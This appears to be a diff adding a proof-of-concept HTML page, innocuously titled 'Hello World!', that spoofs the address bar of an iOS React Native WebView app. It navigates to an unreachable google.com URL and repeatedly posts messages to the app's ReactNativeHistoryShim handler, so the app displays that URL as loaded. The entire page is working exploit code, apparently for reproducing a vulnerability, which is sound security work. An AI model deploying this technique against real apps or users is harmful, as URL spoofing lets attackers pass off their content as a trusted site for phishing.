@@ -1,0 +1,53 @@
+<!doctype html>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Hello World!</title>
+
+<h1>Hello World!</h1>
+<button id="go">start</button>
+<pre id="log"></pre>
+
+<script>
+    const TARGET = "https://www.google.com:1337/";
+    const DURATION_MS = 3000;
+    const INTERVAL_MS = 250;
+
+    const logEl = document.getElementById("log");
+    const log = (message) => {
+        logEl.textContent += `${new Date().toTimeString().slice(0, 8)}  ${message}\n`;
+    };
+
+    const shim = window.webkit?.messageHandlers?.ReactNativeHistoryShim;
+
+    // webView.URL moves to a navigation target before the document is replaced.
+    // Poking the shim makes the app record that URL as loaded.
+    const start = () => {
+        if (!shim) {
+            log("ReactNativeHistoryShim absent");
+            return;
+        }
+
+        log(`navigating to ${TARGET}`);
+        location.href = TARGET;
+
+        const deadline = Date.now() + DURATION_MS;
+        let pokes = 0;
+        const timer = setInterval(() => {
+            if (Date.now() > deadline) {
+                clearInterval(timer);
+                log(`done, ${pokes} pokes — check the address bar`);
+                return;
+            }
+            try {
+                shim.postMessage("other");
+                pokes += 1;
+            } catch (error) {
+                log(`postMessage failed: ${error.name}`);
+            }
+        }, INTERVAL_MS);
+    };
+
+    document.getElementById("go").addEventListener("click", start);
+    log(`origin ${location.origin}`);
+    log(shim ? "shim present" : "shim absent");
+</script>
